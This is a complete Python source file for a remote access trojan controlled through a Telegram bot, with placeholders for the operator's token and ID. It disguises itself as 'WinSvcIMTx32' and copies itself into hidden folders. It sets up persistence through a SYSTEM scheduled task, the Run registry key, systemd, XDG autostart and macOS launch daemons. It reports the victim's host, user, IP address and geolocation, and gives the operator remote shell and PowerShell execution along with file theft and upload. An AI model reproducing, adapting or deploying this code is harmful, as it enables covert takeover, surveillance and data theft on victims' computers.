# -*- coding: utf-8 -*-
import asyncio,atexit,getpass,json,logging,os,platform,random,shutil,signal,socket,string,subprocess,sys,time,urllib.request,uuid
from pathlib import Path
from aiogram import Bot,Dispatcher,F
from aiogram.exceptions import TelegramConflictError,TelegramUnauthorizedError
from aiogram.filters import Command
from aiogram.types import ErrorEvent,Message,FSInputFile
IS_WIN=sys.platform.startswith("win");IS_MAC=sys.platform=="darwin";IS_LINUX=not IS_WIN and not IS_MAC
if IS_WIN:
 import ctypes,winreg
if IS_WIN:
 try:
  _k32=ctypes.windll.kernel32;_k32.SetConsoleOutputCP(65001);_k32.SetConsoleCP(65001)
 except:pass
for _s in(sys.stdout,sys.stderr):
 try:_s.reconfigure(encoding="utf-8",errors="replace")
 except:pass
os.environ.setdefault("PYTHONIOENCODING","utf-8");os.environ.setdefault("PYTHONUTF8","1")
TOKEN="__TOKEN__";ADMIN_ID=__ADMIN_ID__;CLIENT_NAME="__NAME__";APP_NAME="WinSvcIMTx32";APP_LABEL=f"com.{APP_NAME}";MAX_UPLOAD=50*1024*1024
bot=Bot(token=TOKEN);dp=Dispatcher()
logging.getLogger("aiogram").setLevel(logging.CRITICAL);logging.getLogger("asyncio").setLevel(logging.CRITICAL)
_start_ts=time.time();_offline=False;_loop=None;_shutdown_done=False;_pending_put=None
def _rand(n=10):return"".join(random.choices(string.ascii_lowercase+string.digits,k=n))
def _hide(p):
 if not IS_WIN:return
 try:
  s=str(p);a=ctypes.windll.kernel32.GetFileAttributesW(s)
  if a==-1:a=0x80
  ctypes.windll.kernel32.SetFileAttributesW(s,a|0x02|0x04)
 except:pass
def _write_text(p,t,mode=None):
 p.parent.mkdir(parents=True,exist_ok=True)
 with open(p,"w",encoding="utf-8",newline="\n")as f:f.write(t)
 if mode is not None:
  try:os.chmod(p,mode)
  except:pass
def _oem():
 try:return f"cp{ctypes.windll.kernel32.GetOEMCP()}"
 except:return"cp866"
def _dec(raw):
 if not raw:return""
 try:return raw.decode("utf-8")
 except UnicodeDecodeError:return raw.decode(_oem(),errors="replace")
class _C:
 def __init__(s,rc,out,err):s.returncode=rc;s.stdout=out;s.stderr=err
def _run(args,timeout=30):
 try:
  if IS_WIN:
   q=subprocess.list2cmdline(args);r=subprocess.run(q,shell=True,capture_output=True,timeout=timeout)
  else:r=subprocess.run(args,capture_output=True,timeout=timeout)
  return _C(r.returncode,_dec(r.stdout or b""),_dec(r.stderr or b""))
 except Exception as e:return _C(-1,"",str(e))
def is_admin():
 try:
  if IS_WIN:return bool(ctypes.windll.shell32.IsUserAnAdmin())
  return os.geteuid()==0
 except:return False
def _config_dir():
 if IS_WIN:b=os.environ.get("APPDATA")or os.path.expanduser("~")
 elif IS_MAC:b=os.path.expanduser("~/Library/Application Support")
 else:b=os.environ.get("XDG_CONFIG_HOME")or os.path.expanduser("~/.config")
 return Path(b)/APP_NAME
def _data_dir():
 if IS_WIN:
  if is_admin():return Path(os.environ.get("PROGRAMDATA",r"C:\ProgramData"))
  return Path(os.environ.get("LOCALAPPDATA")or os.environ.get("APPDATA")or os.path.expanduser("~"))
 if IS_MAC:
  if is_admin():return Path("/Library/Application Support")
  return Path(os.path.expanduser("~/Library/Application Support"))
 if is_admin():return Path("/opt")
 b=os.environ.get("XDG_DATA_HOME")or os.path.expanduser("~/.local/share")
 return Path(b)
def _marker_file():return _config_dir()/"install_path"
def _read_install_path():
 try:
  if IS_WIN:
   k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,rf"Software\{APP_NAME}",0,winreg.KEY_READ);v,_=winreg.QueryValueEx(k,"LaunchPath");winreg.CloseKey(k)
  else:v=_marker_file().read_text(encoding="utf-8").strip()
  return v if v and os.path.exists(v)else None
 except:return None
def _save_install_path(p):
 try:
  if IS_WIN:
   k=winreg.CreateKey(winreg.HKEY_CURRENT_USER,rf"Software\{APP_NAME}");winreg.SetValueEx(k,"LaunchPath",0,winreg.REG_SZ,p);winreg.CloseKey(k)
  else:_write_text(_marker_file(),p)
 except:pass
def _clear_install_path():
 try:
  if IS_WIN:winreg.DeleteKey(winreg.HKEY_CURRENT_USER,rf"Software\{APP_NAME}")
  else:_marker_file().unlink(missing_ok=True)
 except:pass
def _make_launcher(folder,script):
 if IS_WIN:
  pyw=Path(sys.executable).with_name("pythonw.exe")
  if not pyw.exists():pyw=Path(sys.executable)
  l=folder/f"{APP_NAME}.vbs"
  _write_text(l,'Set sh = CreateObject("WScript.Shell")\n'+f'sh.Run """{pyw}"" ""{script}""", 0, False\n');_hide(l)
 else:
  l=folder/f"{APP_NAME}.sh"
  _write_text(l,"#!/bin/sh\n"+f'exec "{sys.executable}" "{script}" "$@"\n',mode=0o755)
 return l
def install_self():
 s=_read_install_path()
 if s:return s
 try:
  fr=getattr(sys,"frozen",False);src=Path(sys.executable if fr else __file__).resolve()
  ext=".exe" if fr and IS_WIN else(""if fr else".py")
  base=_data_dir();folder=base/f".{_rand(10)}"
  try:folder.mkdir(parents=True,exist_ok=True)
  except:folder=Path.home()/f".{_rand(10)}";folder.mkdir(parents=True,exist_ok=True)
  _hide(folder);dst=folder/f"{APP_NAME}{ext}"
  if src.resolve()!=dst.resolve():shutil.copy2(src,dst)
  _hide(dst)
  if not fr and not IS_WIN:
   try:os.chmod(dst,0o755)
   except:pass
  l=dst if fr else _make_launcher(folder,dst);_save_install_path(str(l));return str(l)
 except:return str(Path(sys.executable if getattr(sys,"frozen",False)else __file__).resolve())
def _autostart_windows(t):
 if is_admin():
  tr=f'"{t}"'if" "in t else t
  r=_run(["schtasks","/Create","/TN",APP_NAME,"/TR",tr,"/SC","ONLOGON","/RL","HIGHEST","/RU","SYSTEM","/F"])
  return f"✅ [all-users] {APP_NAME} → {t}" if r.returncode==0 else f"⚠️ schtasks: {(r.stderr or r.stdout).strip()}"
 try:
  k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE);winreg.SetValueEx(k,APP_NAME,0,winreg.REG_SZ,t);winreg.CloseKey(k);return f"✅ [current-user] HKCU\\Run → {t}"
 except Exception as e:return f"⚠️ reg: {e}"
def _autostart_linux(t):
 if is_admin():
  unit="[Unit]\n"+f"Description={APP_NAME}\n"+"After=network-online.target\nWants=network-online.target\n\n[Service]\nType=simple\n"+f"ExecStart={t}\n"+"Restart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\n"
  up=Path(f"/etc/systemd/system/{APP_NAME}.service")
  try:
   _write_text(up,unit,mode=0o644);_run(["systemctl","daemon-reload"]);_run(["systemctl","enable","--now",f"{APP_NAME}.service"]);return f"✅ [systemd] {APP_NAME} → {t}"
  except Exception as e:return f"⚠️ systemd: {e}"
 ad=Path(os.environ.get("XDG_CONFIG_HOME")or os.path.expanduser("~/.config"))/"autostart"
 d="[Desktop Entry]\nType=Application\n"+f"Name={APP_NAME}\nExec={t}\nTerminal=false\nX-GNOME-Autostart-enabled=true\n"
 try:
  _write_text(ad/f"{APP_NAME}.desktop",d,mode=0o644);return f"✅ [xdg-autostart] {APP_NAME} → {t}"
 except Exception as e:return f"⚠️ desktop: {e}"
def _autostart_macos(t):
 pl='<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n<dict>\n'+f'  <key>Label</key><string>{APP_LABEL}</string>\n  <key>ProgramArguments</key>\n  <array><string>{t}</string></array>\n  <key>RunAtLoad</key><true/>\n  <key>KeepAlive</key><true/>\n</dict>\n</plist>\n'
 pd=Path("/Library/LaunchDaemons")if is_admin()else Path(os.path.expanduser("~/Library/LaunchAgents"))
 pp=pd/f"{APP_LABEL}.plist"
 try:
  _write_text(pp,pl,mode=0o644);_run(["launchctl","unload",str(pp)]);r=_run(["launchctl","load","-w",str(pp)])
  if r.returncode!=0:return f"⚠️ launchctl: {(r.stderr or r.stdout).strip()}"
  return f"✅ [{'daemon' if is_admin() else 'agent'}] {APP_LABEL} → {t}"
 except Exception as e:return f"⚠️ plist: {e}"
def autostart_install():
 try:
  t=install_self()
  if IS_WIN:return _autostart_windows(t)
  if IS_MAC:return _autostart_macos(t)
  return _autostart_linux(t)
 except Exception as e:return f"⚠️ install err: {e}"
def _flag(cc):
 if not cc or len(cc)!=2:return"🏳️"
 try:return"".join(chr(0x1F1E6+ord(c.upper())-65)for c in cc)
 except:return"🏳️"
def get_geo_info():
 # Tries multiple geo-IP APIs in order; returns "IP / flag country city (lat, lon)".
 # Each entry: (URL, [ip_key, cc_key, country_key, city_key, lat_key, lon_key]).
 apis=[
  ("https://ipwho.is/",("ip","country_code","country","city","latitude","longitude")),
  ("https://ipapi.co/json/",("ip","country_code","country_name","city","latitude","longitude")),
  ("https://freeipapi.com/api/json",("ipAddress","countryCode","countryName","cityName","latitude","longitude")),
  ("https://get.geojs.io/v1/ip/geo.json",("ip","country_code","country","city","latitude","longitude")),
  ("https://api.ip.sb/geoip",("ip","country_code","country","city","latitude","longitude")),
  ("http://ipwhois.app/json/",("ip","country_code","country","city","latitude","longitude")),
  ("http://ip-api.com/json/",("query","countryCode","country","city","lat","lon")),
  ("https://ipinfo.io/json",("ip","country","country","city",None,None)),
  ("https://api.myip.com",("ip","cc","country",None,None,None)),
 ]
 for url,keys in apis:
  try:
   with urllib.request.urlopen(url,timeout=6)as r:
    d=json.loads(r.read().decode("utf-8",errors="replace"))
   ip=d.get(keys[0])
   if not ip:continue
   cc=d.get(keys[1])or""
   country=d.get(keys[2])or"?"
   city=d.get(keys[3])or"?"
   lat=d.get(keys[4])if keys[4]else None
   lon=d.get(keys[5])if keys[5]else None
   coords=f" ({lat}, {lon})"if lat is not None and lon is not None else""
   return f"🌍 Public IP: {ip}\n{_flag(cc)} {country}, {city}{coords}"
  except:pass
 return"🌍 Public IP: unknown"
def get_public_ip():
 for u in("https://api.ipify.org","https://ifconfig.me/ip","https://icanhazip.com"):
  try:
   with urllib.request.urlopen(u,timeout=5)as r:return r.read().decode("utf-8",errors="replace").strip()
  except:pass
 return"unknown"
def get_local_ip():
 try:
  s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(("8.8.8.8",80));ip=s.getsockname()[0];s.close();return ip
 except:return"unknown"
def get_mac():
 try:return f"{uuid.getnode():012X}"
 except:return"unknown"
def get_device_info():
 try:u=getpass.getuser()
 except:u="unknown"
 try:return"\n".join([f"🖥 Host: {platform.node()}",f"👤 User: {u}",f"💻 OS: {platform.system()} {platform.release()} ({platform.version()})",f"🏗 Architecture: {platform.machine()}",f"🌐 Local IP: {get_local_ip()}",get_geo_info(),f"🔗 MAC: {get_mac()}",f"📁 CWD: {os.getcwd()}",f"📂 Installed: {_read_install_path()or'❌'}",f"🛡 Admin: {is_admin()}",f"🐧 Platform: {'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}",f"\n",f"Type /help to see command list."])
 except Exception as e:return f"[device info error: {e}]"
async def build_online_message():
 try:i=await asyncio.to_thread(get_device_info)
 except Exception as e:i=f"[info err: {e}]"
 return f"🟢 [{CLIENT_NAME}] ONLINE!\n\n{i}"
def run_cmd(c):
 try:
  r=subprocess.run(c,shell=True,capture_output=True);o=_dec((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
 except Exception as e:return f"[error: {e}]"
def run_cmd_cmdline(c):
 try:
  if IS_WIN:r=subprocess.run(["cmd.exe","/c",c],capture_output=True)
  else:r=subprocess.run(c,shell=True,capture_output=True)
  o=_dec((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
 except Exception as e:return f"[error: {e}]"
def run_cmd_ps(c):
 if not IS_WIN:return"[powershell] only supported on Windows"
 try:
  r=subprocess.run(["powershell","-NoProfile","-NonInteractive","-Command",c],capture_output=True)
  o=_dec((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
 except Exception as e:return f"[error: {e}]"
def split_msg(t,l=4000):
 for i in range(0,len(t),l):yield t[i:i+l]
def is_adm(m):
 try:return bool(m.from_user and m.from_user.id==ADMIN_ID)
 except:return False
async def _safe_send(t):
 try:await bot.send_message(ADMIN_ID,t)
 except:pass
async def _send_and_exit(t):
 await _safe_send(t);await asyncio.sleep(0.3);os._exit(0)
def _on_signal(signum,frame):
 global _shutdown_done
 if _shutdown_done:return
 _shutdown_done=True
 try:
  if _loop and not _loop.is_closed():
   asyncio.run_coroutine_threadsafe(_send_and_exit(f"⚠️ [{CLIENT_NAME}] shutting down (signal {signum})"),_loop);return
 except:pass
 os._exit(0)
def _on_exit():
 global _shutdown_done
 if _shutdown_done:return
 _shutdown_done=True
 try:asyncio.run(_safe_send(f"⚠️ [{CLIENT_NAME}] process exiting"))
 except:pass
atexit.register(_on_exit)
for _sg in(signal.SIGINT,signal.SIGTERM):
 try:signal.signal(_sg,_on_signal)
 except:pass
if IS_WIN:
 try:signal.signal(signal.SIGBREAK,_on_signal)
 except:pass
@dp.errors()
async def _on_error(e):return True
@dp.message(Command("start"))
async def cmd_start(m):
 try:
  if not is_adm(m):return await m.answer("⛔ Access denied")
  await m.answer(await build_online_message())
 except:pass
@dp.message(Command("help"))
async def cmd_help(m):
 try:
  if not is_adm(m):return await m.answer("⛔ Access denied")
  await m.answer(f"📖 [{CLIENT_NAME}] commands\n\n/start — host info + geo\n/heartbeat — liveness probe (uptime, PID, offline flag)\n/help — this message\n/getfile <path> — download a file from the target\n    example: /getfile C:\\Users\\Public\\log.txt\n/putfile <dir> — upload a file from Telegram into <dir>\n    example: /putfile C:\\Users\\Public\n    (bot will then ask you to send the file)\n/cmd <command> — run via cmd.exe (Windows) / sh (Unix)\n    example: /cmd dir\n/powershell <command> — run via PowerShell (Windows only)\n    example: /powershell Get-Process | Select -First 5\n\nanything else — shell command (no timeout)\n    example: dir\n    example: ps aux | head\n\nlimits:\n  • max upload: {MAX_UPLOAD//(1024*1024)} MB per file")
 except:pass
@dp.message(Command("getfile"))
async def cmd_getfile(m):
 try:
  if not is_adm(m):return await m.answer("⛔ Access denied")
  r=(m.text or"").strip();p_=r.split(maxsplit=1)
  if len(p_)<2 or not p_[1].strip():return await m.answer("usage: /getfile <path>\nexample: /getfile C:\\Users\\Public\\log.txt\nexample: /getfile /etc/passwd")
  p=Path(p_[1].strip().strip('"').strip("'"))
  if not p.exists():return await m.answer(f"❌ not found: {p}")
  if p.is_dir():return await m.answer(f"❌ is a directory, not a file: {p}")
  try:s=p.stat().st_size
  except Exception as e:return await m.answer(f"❌ cannot stat: {e}")
  if s==0:return await m.answer(f"❌ empty file: {p}")
  if s>MAX_UPLOAD:return await m.answer(f"❌ file too large: {s/1024/1024:.1f} MB (limit {MAX_UPLOAD//(1024*1024)} MB)")
  try:
   d=FSInputFile(str(p),filename=p.name);await m.answer_document(d,caption=f"[{CLIENT_NAME}] {p}")
  except Exception as e:
   try:await m.answer(f"❌ upload failed: {e}")
   except:pass
 except:pass
@dp.message(Command("putfile"))
async def cmd_putfile(m):
 global _pending_put
 try:
  if not is_adm(m):return await m.answer("⛔ Access denied")
  r=(m.text or"").strip();p_=r.split(maxsplit=1)
  if len(p_)<2 or not p_[1].strip():return await m.answer("usage: /putfile <target_directory>\nexample: /putfile C:\\Users\\Public\nexample: /putfile /tmp")
  d=Path(p_[1].strip().strip('"').strip("'"))
  if not d.exists():return await m.answer(f"❌ directory not found: {d}")
  if not d.is_dir():return await m.answer(f"❌ not a directory: {d}")
  _pending_put=str(d)
  await m.answer(f"📤 send me the file to save into:\n{d}\n\n(send as a document, not as a photo)")
 except:pass
@dp.message(F.document)
async def cmd_putrecv(m):
 global _pending_put
 try:
  if not is_adm(m):return
  if not _pending_put:return
  d=Path(_pending_put);_pending_put=None
  fn=(m.document.file_name or"").replace("\\","/");fn=os.path.basename(fn) or f"upload_{_rand(8)}"
  dst=d/fn
  try:await bot.download(m.document,destination=dst)
  except Exception as e:return await m.answer(f"❌ download failed: {e}")
  try:s=dst.stat().st_size
  except:s=0
  await m.answer(f"✅ saved: {dst}\n📦 {s} bytes")
 except Exception as e:
  try:await m.answer(f"❌ putfile err: {e}")
  except:pass
@dp.message(Command("heartbeat"))
async def cmd_heartbeat(m):
 try:
  if not is_adm(m):return await m.answer("⛔ Access denied")
  up=int(time.time()-_start_ts);h,rem=divmod(up,3600);mn,sc=divmod(rem,60)
  await m.answer(f"💓 [{CLIENT_NAME}] alive\n⏱ uptime: {h}h {mn}m {sc}s\n🆔 pid: {os.getpid()}\n📡 offline flag: {_offline}\n🛡 admin: {is_admin()}\n🐧 platform: {'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}")
 except:pass
@dp.message(Command("cmd"))
async def cmd_cmd(m):
 try:
  if not is_adm(m):return await m.answer("⛔ Access denied")
  parts=(m.text or"").strip().split(maxsplit=1)
  if len(parts)<2 or not parts[1].strip():return await m.answer("usage: /cmd <command>\nexample: /cmd dir")
  o=await asyncio.to_thread(run_cmd_cmdline,parts[1].strip())
  for ch in split_msg(o):
   try:await m.answer(f"[{CLIENT_NAME}]\n```\n{ch}\n```",parse_mode="Markdown")
   except:
    try:await m.answer(f"[{CLIENT_NAME}] {ch}")
    except:pass
 except:pass
@dp.message(Command("powershell"))
async def cmd_ps(m):
 try:
  if not is_adm(m):return await m.answer("⛔ Access denied")
  parts=(m.text or"").strip().split(maxsplit=1)
  if len(parts)<2 or not parts[1].strip():return await m.answer("usage: /powershell <command>\nexample: /powershell Get-Process | Select -First 5")
  o=await asyncio.to_thread(run_cmd_ps,parts[1].strip())
  for ch in split_msg(o):
   try:await m.answer(f"[{CLIENT_NAME}]\n```\n{ch}\n```",parse_mode="Markdown")
   except:
    try:await m.answer(f"[{CLIENT_NAME}] {ch}")
    except:pass
 except:pass
@dp.message(F.text)
async def cmd_exec(m):
 try:
  if not is_adm(m):return await m.answer("⛔ Access denied")
  c=(m.text or"").strip()
  if not c:return
  o=await asyncio.to_thread(run_cmd,c)
  for ch in split_msg(o):
   try:await m.answer(f"[{CLIENT_NAME}]\n```\n{ch}\n```",parse_mode="Markdown")
   except:
    try:await m.answer(f"[{CLIENT_NAME}] {ch}")
    except:pass
 except:pass
async def notify_admin(t):
 try:await bot.send_message(ADMIN_ID,t)
 except:pass
async def on_startup():
 try:r=await asyncio.to_thread(autostart_install)
 except Exception as e:r=f"⚠️ autostart err: {e}"
 await notify_admin((await build_online_message())+f"\n\n{r}")
async def _notify_back_online():
 try:await notify_admin(f"🟢 [{CLIENT_NAME}] back online\n\n{await build_online_message()}")
 except:pass
async def polling_loop():
 global _offline
 pt=asyncio.create_task(dp.start_polling(bot,handle_signals=False))
 if _offline:
  _,p=await asyncio.wait([pt],timeout=3.0)
  if pt in p:
   _offline=False;asyncio.create_task(_notify_back_online())
 try:
  await pt;return False
 except TelegramUnauthorizedError:await notify_admin(f"❌ [{CLIENT_NAME}] Invalid token — exiting");return True
 except TelegramConflictError:await notify_admin(f"⚠️ [{CLIENT_NAME}] Token already in use — exiting");return True
 except asyncio.CancelledError:return True
 except BaseException as e:
  if not _offline:
   _offline=True;await notify_admin(f"⚠️ [{CLIENT_NAME}] connection lost: {type(e).__name__}: {e}")
  return False
async def main():
 global _loop
 _loop=asyncio.get_running_loop()
 try:await on_startup()
 except:pass
 while True:
  if await polling_loop():return
  await asyncio.sleep(10)
if __name__=="__main__":
 while True:
  try:asyncio.run(main());break
  except KeyboardInterrupt:break
  except:
   try:import time;time.sleep(10)
   except:pass